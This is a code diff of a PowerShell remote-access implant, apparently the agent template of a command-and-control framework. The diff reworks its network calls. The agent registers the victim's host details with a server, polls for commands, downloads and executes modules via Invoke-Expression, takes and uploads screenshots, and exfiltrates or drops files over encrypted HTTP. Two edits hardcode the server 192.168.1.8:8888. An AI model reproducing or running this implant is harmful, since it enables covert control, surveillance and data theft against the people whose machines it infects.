@@ -1,4 +1,4 @@
-$beacon={beacon}
+$beacon=1
 function CAM ($key,$IV){
 try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
 } catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
@@ -62,10 +62,11 @@ $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
 $bitmap.Save($File)
 $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
-$handle = new-object net.WebClient;
-$handleh = $handle.Headers;
-$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-$output=$handle.UploadString("http://{ip}:{port}{image}/$agent", ":$content`:");
+
+            $postParams = @{data=":$content`:"}
+            $re=Invoke-WebRequest -Uri http://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
+
+
 $final=[System.Convert]::FromBase64String($content)
 echo $final  | Set-Content $File -Encoding Byte
 rm $File
@@ -86,10 +87,13 @@ return $output
                   return $output
                   }
             $content = enc -key $key -un $file_content -file 1
-            $handle = new-object net.WebClient;
-            $handleh = $handle.Headers;
-            $handleh.add("Content-Type", "application/x-www-form-urlencoded");
-            $output=$handle.UploadString("http://{ip}:{port}{download}/$agent", "f:$filename&d:$content");
+
+
+            $postParams = @{f=$filename;d=$content}
+            $output=Invoke-WebRequest -Uri http://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+            #echo "returned $re.RawContent"
+
+
             return $output
             }
 
@@ -97,33 +101,25 @@ return $output
 function up($filename){
 
 $filenameenc=enc -key $key -un $filename
-#echo $filename
-#$t=(Invoke-WebRequest -UseBasicParsing -Uri http://{ip}:{port}{upload}/$filenameenc).Content
 
-$req = [System.Net.WebRequest]::Create("http://{ip}:{port}{upload}/$filenameenc")
-$resp = $req.GetResponse()
-$reqstream = $resp.GetResponseStream()
-$stream = new-object System.IO.StreamReader $reqstream
-$data = $stream.ReadToEnd()
 
-#$data=[System.Text.Encoding]::UTF8.GetString($t)
-$data=dec -key $key -enc $data -file 1
+$re=Invoke-WebRequest -Uri http://192.168.1.8:8888/uddigui?page=$filenameenc -Method GET
+
+$data=dec -key $key -enc $re.Content -file 1
 
 echo $data | Set-Content $filename -Encoding Byte
-
 }
 
 
       function load($module)
       {
-
+      #echo "Test"
 
             $modulename = enc -key $key -un $module
-            $handle = new-object net.WebClient;
-            $handleh = $handle.Headers;
-            $handleh.add("Content-Type", "application/x-www-form-urlencoded");
-            $enc=$handle.UploadString("http://{ip}:{port}{md}/$agent", "$modulename");
-            $modulecontent=dec -key $key -enc $enc
+            $postParams = @{data=$modulename}
+            $re=Invoke-WebRequest -Uri http://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
+            #echo "returned $re.RawContent"
+            $modulecontent=dec -key $key -enc $re.Content
 
 
       return $modulecontent
@@ -139,17 +135,15 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 $IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
 $random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 $agent="$random-img.jpeg"
-$finaldata="$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
+$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("http://{ip}:{port}{register}/$agent",$finaldata)
+      $key=$wc3.UploadString("http://{ip}:{port}{register}?page=$agent",$finaldata)
 $progressPreference = 'silentlyContinue';
 
 $wc3 = New-Object system.Net.WebClient;
 while($true){
-#$t=(Invoke-WebRequest -UseBasicParsing -Uri http://{ip}:{port}{cmd}/$agent).Content
-#$enc=[System.Text.Encoding]::UTF8.GetString($t)
-$req = [System.Net.WebRequest]::Create("http://{ip}:{port}{cmd}/$agent")
+$req = [System.Net.WebRequest]::Create("http://{ip}:{port}{cmd}?page=$agent")
 $resp = $req.GetResponse()
 $reqstream = $resp.GetResponseStream()
 $stream = new-object System.IO.StreamReader $reqstream
@@ -159,7 +153,7 @@ $enc = $stream.ReadToEnd()
 if($enc -eq "REGISTER"){
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("http://{ip}:{port}{register}/$agent",$finaldata)
+      $key=$wc3.UploadString("http://{ip}:{port}{register}?page=$agent",$finaldata)
 $progressPreference = 'silentlyContinue';
 continue
 }
@@ -204,6 +198,7 @@ $output="beacon changed successfully"
 elseif($cm.split(" ")[0] -eq "load"){
 $f=$cm.split(" ")[1]
 $module=load -module $f
+echo "$f $module"
 try{
 $output=Invoke-Expression ($module) -ErrorVariable badoutput | Out-String
         }
@@ -233,7 +228,12 @@ $output="$output$badoutput"
 
 $redata=enc -key $key -un $output
 
-$re = $wc3.UploadString("http://{ip}:{port}{re}/$agent",$redata);
+
+$postParams = @{data=$redata}
+
+$re=Invoke-WebRequest -Uri http://192.168.1.8:8888/default?page=$agent -Method POST -Body $postParams
+
+#$re = $wc3.UploadString("http://{ip}:{port}{re}?page=$agent","data=$redata");
 
 }
 }
